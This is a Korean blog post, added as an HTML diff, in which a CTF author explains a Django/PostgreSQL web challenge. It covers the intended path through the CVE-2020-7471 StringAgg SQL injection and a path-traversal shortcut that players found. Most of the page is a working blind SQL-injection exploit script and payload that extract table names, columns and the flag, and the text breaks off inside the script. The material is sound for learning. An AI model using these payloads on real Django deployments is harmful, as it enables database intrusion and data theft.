@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Tempuss Blog" /></head>
+<style>@import url(/public/css/syntax/monokai.css);</style>
+  <title>Tempuss Blog</title>
+  <!-- <link href="/public/css/bootstrap.min.css" rel="stylesheet"> -->
+
+  <link href="/public/css/style.css" rel="stylesheet">
+  <body>
+  	<div class="container"> 
+		<div class="sidebar">
+			<div class="sidebar-item sidebar-header">
+	<div class='sidebar-brand'>
+		<a href="/about/">Tempuss Blog</a>
+	</div>
+	<p class="lead">보안하는 개발자</p></div>
+
+<div class="sidebar-item sidebar-nav">
+	<ul class="nav">
+      <li class="nav-title">Pages</li>
+	  <li>
+	  	<a class="nav-item" href="/">Articles</a>
+	  </li>
+	  
+	  
+	    
+	  
+	    
+	      
+	        <li>
+	        	<a class="nav-item" href="/about/">
+	            	About
+	            </a>
+	        </li>
+	      
+	    
+	  
+	    
+	      
+	    
+	  
+	    
+	  
+	    
+	  
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-nav">
+  	<ul class="nav">
+			<li class="nav-title">Categories</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Hacking">
+				<span class="name">Hacking</span>
+				<span class="badge">40</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Web">
+				<span class="name">Web</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#BoB">
+				<span class="name">BoB</span>
+				<span class="badge">9</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Data-Engineering">
+				<span class="name">Data-Engineering</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	  </nav>
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-footer">
+	<p>Powered by <a href="https://github.com/jekyll/jekyll">Jekyll</a></p>
+</div>
+		</div>
+		<div class="content">
+			<article class="post">
+	<header class="post-header">
+		<div class="post-title"> 
+			Christmas CTF 문제(DOBBY_IS_FREE!) 출제 후기
+		</div>
+		<time class="post-date dt-published" datetime="2020-12-27T00:00:00+09:00" itemprop="datePublished">2020/12/27
+		</time>		
+	</header>
+
+	<div class="post-content">
+		<h1 id="dobby_is_free">DOBBY_IS_FREE!</h1>
+
+<ul>
+  <li>출제된 CTF: <a href="https://dreamhack.io/ctf/4">2020 Christmas CTF</a></li>
+  <li>분야: WEB</li>
+  <li>키워드: DOBBY_IS_FREE!</li>
+  <li>난이도: ★★★☆☆</li>
+</ul>
+
+<h2 id="배경">배경</h2>
+<p>일반적으로 Web Hacker들이 mysql에 대한 SQL Injection을 주로 공부하는걸 보니 
+postgresql을 사용해서 Injection 문제를 만들어서 다양한 DB에 대한 공격을 
+경험해봤으면 하는 생각에서 만들었습니다.</p>
+
+<h2 id="풀이">풀이</h2>
+<h3 id="의도한-풀이">의도한 풀이</h3>
+
+<ul>
+  <li>
+    <p>Django 서비스에서 발생한 취약점이므로 이에 대한 힌트를 주기 위해 
+HTTP Response에 Version이라는  커스텀 헤더를 추가하여<br />
+<code class="highlighter-rouge">Django</code>, <code class="highlighter-rouge">Postgres</code> 버전을 명시했습니다. <code class="highlighter-rouge">Django 3.0.1</code> 버전에서 발생하는 SQL Injection 취약점 검색시 공개된 poc 코드등이 있습니다.
+<img src="/assets/img/CUSTOM_HEADER.png" alt="Custom_Header Response" /></p>
+  </li>
+  <li>
+    <p>웹 사이트 접근시 게시글 목록 출력
+<img src="/assets/img/list.png" alt="Post List" /></p>
+  </li>
+  <li>
+    <p>좌측 번호 클릭시 해당 게시글에 대한 pk와 content값을 기반으로 게시글 조회
+<img src="/assets/img/post.png" alt="Post" /></p>
+  </li>
+  <li>
+    <p>실제 백엔드 코드</p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">results</span> <span class="o">=</span> <span class="n">Blog</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="nb">filter</span><span class="p">(</span><span class="n">pk</span><span class="o">=</span><span class="n">blog_id</span><span class="p">,</span> <span class="n">content__contains</span><span class="o">=</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">values</span><span class="p">(</span><span class="s">'title'</span><span class="p">)</span><span class="o">.</span><span class="n">annotate</span><span class="p">(</span>
+  <span class="n">custom_field</span><span class="o">=</span><span class="n">StringAgg</span><span class="p">(</span><span class="s">'content'</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">=</span><span class="n">content</span><span class="p">))</span><span class="o">.</span><span class="nb">all</span><span class="p">()</span>
+</code></pre></div>    </div>
+    <p>StringAgg함수를 통해 구분자와 함께 문자열을 붙여서 리턴해주는 함수 인데 해당 
+input값에 대한 입력값 검증이 없어서 저 <code class="highlighter-rouge">content</code>  부분에 injection payload를 넣을수 있습니다.</p>
+  </li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http:///vul/1/?content=-\\\\') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when (SELECT length(string_agg(vul_flag.flag, '')) FROM vul_flag) &lt; 500 then true else false end GROUP BY "vul_blog"."title" LIMIT 1 offset 1 --
+</code></pre></div></div>
+
+<h3 id="실제-hacker들의-풀이">실제 Hacker들의 풀이</h3>
+<ul>
+  <li>nginx 서버 설정 실수로 인한 <code class="highlighter-rouge">Path Traversal</code> 취약점 발생 
+<code class="highlighter-rouge">http://118.67.135.137/static../</code> url 접근 후 서버 내 모든 파일 접근이 가능 해짐으로서 백업용 dump 파일을 읽어들여 flag를 획득</li>
+</ul>
+
+<h3 id="취약점">취약점</h3>
+<p>CVE-2020-7471</p>
+
+<ul>
+  <li>
+    <p><code class="highlighter-rouge">Django</code> version  1.11,  2.2   3.0.x ≤ 3.0.2 버전에서 발견된 
+ SQL Injection 취약점 CVE-2020-7471을 이용한 문제</p>
+  </li>
+  <li>
+    <p>postgresql 관련 함수 중  <code class="highlighter-rouge">StringAgg</code> 함수와 관련된 코드에서 
+인자값 검사 기능이 미흡해 발생한 취약점</p>
+  </li>
+</ul>
+
+<h3 id="익스플로잇">익스플로잇</h3>
+
+<ul>
+  <li>다음은 익스플로잇 코드입니다.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">server</span> <span class="o">=</span> <span class="s">"http://118.67.135.137/post/"</span>
+
+<span class="nb">id</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">content_param</span> <span class="o">=</span> <span class="n">f</span><span class="s">"/?content="</span>
+<span class="n">content</span> <span class="o">=</span> <span class="s">"IS_FREE!"</span>
+
+
+
+<span class="k">def</span> <span class="nf">exists_check</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="s">"""응답값 체크용 함수"""</span>
+    <span class="k">if</span> <span class="s">"title"</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="p">,</span>
+    <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate, br"</span><span class="p">,</span>
+    <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"</span><span class="p">,</span>
+    <span class="s">"Cache-Control"</span><span class="p">:</span> <span class="s">"no-cache"</span><span class="p">,</span>
+    <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"keep-alive"</span><span class="p">,</span>
+    <span class="s">"Host"</span><span class="p">:</span> <span class="s">"127.0.0.1:8000"</span><span class="p">,</span>
+    <span class="s">"Pragma"</span><span class="p">:</span> <span class="s">"no-cache"</span><span class="p">,</span>
+    <span class="s">"Sec-Fetch-Dest"</span><span class="p">:</span> <span class="s">"document"</span><span class="p">,</span>
+    <span class="s">"Sec-Fetch-Mode"</span><span class="p">:</span> <span class="s">"navigate"</span><span class="p">,</span>
+    <span class="s">"Sec-Fetch-Site"</span><span class="p">:</span> <span class="s">"none"</span><span class="p">,</span>
+    <span class="s">"Sec-Fetch-User"</span><span class="p">:</span> <span class="s">"?1"</span><span class="p">,</span>
+    <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+    <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">get_table_info_from_information_schema</span><span class="p">():</span>
+    <span class="c1"># table 개수 조회
+</span>    <span class="n">table_count</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">table_count_get</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="n">table_count_get</span> <span class="ow">is</span> <span class="bp">False</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">"""-</span><span class="se">\\</span><span class="s">&gt;</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">AS</span><span class="si">%20</span><span class="s">"mydefinedname"</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">"vul_blog"</span><span class="si">%20</span><span class="s">
+                    WHERE</span><span class="si">%201</span><span class="s">=1</span><span class="si">%20</span><span class="s">AND</span><span class="si">%20</span><span class="s">case</span><span class="si">%20</span><span class="s">when</span><span class="si">%20</span><span class="s">(SELECT</span><span class="si">%20</span><span class="s">count(table_name)
+                    </span><span class="si">%20</span><span class="s">as</span><span class="si">%20</span><span class="s">cnt</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">information_schema.tables</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%20</span><span class="s">
+                    table_schema=</span><span class="si">%27</span><span class="s">public</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">&lt;=</span><span class="si">%20</span><span class="s">{table_count}</span><span class="si">%20</span><span class="s">then</span><span class="si">%20</span><span class="s">true
+                    </span><span class="si">%20</span><span class="s">else</span><span class="si">%20</span><span class="s">false</span><span class="si">%20</span><span class="s">end</span><span class="si">%20%20</span><span class="s">GROUP</span><span class="si">%20</span><span class="s">BY</span><span class="si">%20</span><span class="s">"vul_blog"."title"</span><span class="si">%20</span><span class="s">
+                    LIMIT</span><span class="si">%201%20</span><span class="s">offset</span><span class="si">%201%20</span><span class="s">--"""</span>
+
+        <span class="n">table_count</span> <span class="o">=</span> <span class="n">table_count</span> <span class="o">+</span> <span class="mi">1</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">"{server}{id}{content_param}{payload}"</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">exists_check</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+            <span class="n">table_count</span> <span class="o">=</span> <span class="n">table_count</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="n">table_count_get</span> <span class="o">=</span> <span class="bp">True</span>
+
+
+    <span class="c1"># table list 추출
+</span>    <span class="n">table_row_list</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="c1"># public table 개수 만큼 loop
+</span>    <span class="k">for</span> <span class="n">table_row</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">table_count</span><span class="p">):</span>
+        <span class="c1"># table 명 길이 조회
+</span>        <span class="k">for</span> <span class="n">table_name_size</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">"""-</span><span class="se">\\</span><span class="s">&gt;</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">AS</span><span class="si">%20</span><span class="s">"mydefinedname"</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">"vul_blog"</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%201</span><span class="s">=1</span><span class="si">%20</span><span class="s">AND
+            </span><span class="si">%20</span><span class="s">case</span><span class="si">%20</span><span class="s">when</span><span class="si">%20</span><span class="s">(select</span><span class="si">%20</span><span class="s">length((SELECT</span><span class="si">%20</span><span class="s">(table_name)</span><span class="si">%20</span><span class="s">as</span><span class="si">%20</span><span class="s">cnt</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">information_schema.tables
+            </span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%20</span><span class="s">table_schema=</span><span class="si">%27</span><span class="s">public</span><span class="si">%27%20</span><span class="s">offset</span><span class="si">%20</span><span class="s">{table_row}</span><span class="si">%20</span><span class="s">limit</span><span class="si">%201</span><span class="s">)))</span><span class="si">%20</span><span class="s">&lt;=</span><span class="si">%20</span><span class="s">{table_name_size}</span><span class="si">%20</span><span class="s">
+            then</span><span class="si">%20</span><span class="s">true</span><span class="si">%20</span><span class="s">else</span><span class="si">%20</span><span class="s">false</span><span class="si">%20</span><span class="s">end</span><span class="si">%20%20</span><span class="s">GROUP</span><span class="si">%20</span><span class="s">BY</span><span class="si">%20</span><span class="s">"vul_blog"."title"</span><span class="si">%20</span><span class="s">LIMIT</span><span class="si">%201%20</span><span class="s">offset</span><span class="si">%201%20</span><span class="s">--"""</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">"{server}{id}{content_param}{payload}"</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">exists_check</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+                <span class="k">break</span>
+        <span class="c1"># table 이름 사이즈 만큼 루프
+</span>        <span class="n">table_name</span> <span class="o">=</span> <span class="s">""</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">table_name_size</span><span class="p">):</span>
+            <span class="k">for</span> <span class="nb">ascii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">"""-</span><span class="se">\\</span><span class="s">&gt;</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">AS</span><span class="si">%20</span><span class="s">"mydefinedname"</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">"vul_blog"</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%201</span><span class="s">=1</span><span class="si">%20</span><span class="s">AND</span><span class="si">%20</span><span class="s">case</span><span class="si">%20</span><span class="s">when
+                </span><span class="si">%20</span><span class="s">(select</span><span class="si">%20</span><span class="s">ascii(substring((SELECT</span><span class="si">%20</span><span class="s">(table_name)</span><span class="si">%20</span><span class="s">as</span><span class="si">%20</span><span class="s">cnt</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">information_schema.tables</span><span class="si">%20</span><span class="s">WHERE
+                </span><span class="si">%20</span><span class="s">table_schema=</span><span class="si">%27</span><span class="s">public</span><span class="si">%27%20</span><span class="s">offset</span><span class="si">%20</span><span class="s">{table_row}</span><span class="si">%20</span><span class="s">limit</span><span class="si">%201</span><span class="s">),</span><span class="si">%20</span><span class="s">{i},1)))</span><span class="si">%20</span><span class="s">&lt;=</span><span class="si">%20</span><span class="s">{ascii}</span><span class="si">%20</span><span class="s">then</span><span class="si">%20</span><span class="s">true</span><span class="si">%20</span><span class="s">
+                else</span><span class="si">%20</span><span class="s">false</span><span class="si">%20</span><span class="s">end</span><span class="si">%20%20</span><span class="s">GROUP</span><span class="si">%20</span><span class="s">BY</span><span class="si">%20</span><span class="s">"vul_blog"."title"</span><span class="si">%20</span><span class="s">LIMIT</span><span class="si">%201%20</span><span class="s">offset</span><span class="si">%201%20</span><span class="s">--"""</span>
+                <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">"{server}{id}{content_param}{payload}"</span>
+                <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">exists_check</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+                    <span class="n">table_name</span> <span class="o">=</span> <span class="n">table_name</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ascii</span><span class="p">))</span>
+                    <span class="k">break</span>
+        <span class="n">table_row_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">table_row_list</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_column_info_from_information_schema</span><span class="p">():</span>
+    <span class="n">vul_flag_column_count</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">table_count_get</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="n">table_count_get</span> <span class="ow">is</span> <span class="bp">False</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">"""-</span><span class="se">\\</span><span class="s">&gt;</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">AS</span><span class="si">%20</span><span class="s">"mydefinedname"</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">"vul_blog"</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%201</span><span class="s">=1</span><span class="si">%20</span><span class="s">AND</span><span class="si">%20</span><span class="s">case</span><span class="si">%20</span><span class="s">when</span><span class="si">%20</span><span class="s">(SELECT</span><span class="si">%20</span><span class="s">
+        count(*)</span><span class="si">%20</span><span class="s">as</span><span class="si">%20</span><span class="s">cnt</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">information_schema.columns</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%20</span><span class="s">table_name=</span><span class="si">%27</span><span class="s">vul_flag</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">&lt;=</span><span class="si">%20</span><span class="s">{vul_flag_column_count}
+        </span><span class="si">%20</span><span class="s">then</span><span class="si">%20</span><span class="s">true</span><span class="si">%20</span><span class="s">else</span><span class="si">%20</span><span class="s">false</span><span class="si">%20</span><span class="s">end</span><span class="si">%20%20</span><span class="s">GROUP</span><span class="si">%20</span><span class="s">BY</span><span class="si">%20</span><span class="s">"vul_blog"."title"</span><span class="si">%20</span><span class="s">LIMIT</span><span class="si">%201%20</span><span class="s">offset</span><span class="si">%201%20</span><span class="s">--"""</span>
+
+        <span class="c1">#time.sleep(1)
+</span>        <span class="n">vul_flag_column_count</span> <span class="o">=</span> <span class="n">vul_flag_column_count</span> <span class="o">+</span> <span class="mi">1</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">"{server}{id}{content_param}{payload}"</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">exists_check</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+            <span class="n">vul_flag_column_count</span> <span class="o">=</span> <span class="n">vul_flag_column_count</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="n">table_count_get</span> <span class="o">=</span> <span class="bp">True</span>
+
+    <span class="n">column_name_list</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">vul_flag_column_count</span><span class="p">):</span>
+        <span class="c1"># table 명 길이 조회
+</span>        <span class="k">for</span> <span class="n">table_name_size</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">"""-</span><span class="se">\\</span><span class="s">&gt;</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">AS</span><span class="si">%20</span><span class="s">"mydefinedname"</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">"vul_blog"</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%201</span><span class="s">=1</span><span class="si">%20</span><span class="s">
+                        AND</span><span class="si">%20</span><span class="s">case</span><span class="si">%20</span><span class="s">when</span><span class="si">%20</span><span class="s">(select</span><span class="si">%20</span><span class="s">length((SELECT</span><span class="si">%20</span><span class="s">(column_name)</span><span class="si">%20</span><span class="s">as</span><span class="si">%20</span><span class="s">cnt
+                        </span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">information_schema.columns</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%20</span><span class="s">table_name=</span><span class="si">%27</span><span class="s">vul_flag
+                        </span><span class="si">%27%20</span><span class="s">offset</span><span class="si">%20</span><span class="s">{i}</span><span class="si">%20</span><span class="s">limit</span><span class="si">%201</span><span class="s">)))</span><span class="si">%20</span><span class="s">&lt;=</span><span class="si">%20</span><span class="s">{table_name_size}</span><span class="si">%20</span><span class="s">then</span><span class="si">%20</span><span class="s">true
+                        </span><span class="si">%20</span><span class="s">else</span><span class="si">%20</span><span class="s">false</span><span class="si">%20</span><span class="s">end</span><span class="si">%20%20</span><span class="s">GROUP</span><span class="si">%20</span><span class="s">BY</span><span class="si">%20</span><span class="s">"vul_blog"."title"</span><span class="si">%20</span><span class="s">LIMIT</span><span class="si">%201%20</span><span class="s">
+                        offset</span><span class="si">%201%20</span><span class="s">--"""</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">"{server}{id}{content_param}{payload}"</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">exists_check</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+                <span class="k">break</span>
+
+        <span class="c1">#vul_flag table column 이름 조회
+</span>        <span class="n">column_name</span> <span class="o">=</span> <span class="s">""</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">table_name_size</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+            <span class="k">for</span> <span class="nb">ascii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">"""-</span><span class="se">\\</span><span class="s">&gt;</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">AS</span><span class="si">%20</span><span class="s">"mydefinedname"</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">"vul_blog"</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%201</span><span class="s">=1</span><span class="si">%20</span><span class="s">
+                AND</span><span class="si">%20</span><span class="s">case</span><span class="si">%20</span><span class="s">when</span><span class="si">%20</span><span class="s">(select</span><span class="si">%20</span><span class="s">ascii(substring((SELECT</span><span class="si">%20</span><span class="s">(column_name)</span><span class="si">%20</span><span class="s">as</span><span class="si">%20</span><span class="s">cnt</span><span class="si">%20</span><span class="s">
+                FROM</span><span class="si">%20</span><span class="s">information_schema.columns</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%20</span><span class="s">table_name=</span><span class="si">%27</span><span class="s">vul_flag</span><span class="si">%27%20</span><span class="s">offset</span><span class="si">%20</span><span class="s">{i}</span><span class="si">%20</span><span class="s">
+                limit</span><span class="si">%201</span><span class="s">),</span><span class="si">%20</span><span class="s">{j},1)))</span><span class="si">%20</span><span class="s">&lt;=</span><span class="si">%20</span><span class="s">{ascii}</span><span class="si">%20</span><span class="s">then</span><span class="si">%20</span><span class="s">true</span><span class="si">%20</span><span class="s">else</span><span class="si">%20</span><span class="s">false</span><span class="si">%20</span><span class="s">end</span><span class="si">%20%20</span><span class="s">GROUP</span><span class="si">%20</span><span class="s">BY</span><span class="si">%20</span><span class="s">"
+                vul_blog"."title"</span><span class="si">%20</span><span class="s">LIMIT</span><span class="si">%201%20</span><span class="s">offset</span><span class="si">%201%20</span><span class="s">--"""</span>
+                <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">"{server}{id}{content_param}{payload}"</span>
+                <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">exists_check</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+                    <span class="n">column_name</span> <span class="o">=</span> <span class="n">column_name</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ascii</span><span class="p">))</span>
+                    <span class="k">break</span>
+        <span class="n">column_name_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">column_name_list</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_flag_from_flag_table</span><span class="p">():</span>
+    <span class="k">for</span> <span class="n">flag_length</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">"""-</span><span class="se">\\</span><span class="s">&gt;</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">AS</span><span class="si">%20</span><span class="s">"mydefinedname"</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">"vul_blog"</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%201</span><span class="s">=1</span><span class="si">%20</span><span class="s">AND</span><span class="si">%20</span><span class="s">case</span><span class="si">%20</span><span class="s">
+        when</span><span class="si">%20</span><span class="s">(SELECT</span><span class="si">%20</span><span class="s">length(string_agg(vul_flag.flag,</span><span class="si">%20%27%27</span><span class="s">))</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">vul_flag)</span><span class="si">%20</span><span class="s">&lt;=</span><span class="si">%20</span><span class="s">{flag_length}
+        </span><span class="si">%20</span><span class="s">then</span><span class="si">%20</span><span class="s">true</span><span class="si">%20</span><span class="s">else</span><span class="si">%20</span><span class="s">false</span><span class="si">%20</span><span class="s">end</span><span class="si">%20%20</span><span class="s">GROUP</span><span class="si">%20</span><span class="s">BY</span><span class="si">%20</span><span class="s">"vul_blog"."title"</span><span class="si">%20</span><span class="s">LIMIT</span><span class="si">%201%20</span><span class="s">offset</span><span class="si">%201%20</span><span class="s">--"""</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">"{server}{id}{content_param}{payload}"</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">exists_check</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+            <span class="k">break</span>
+
+    <span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">flag_length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
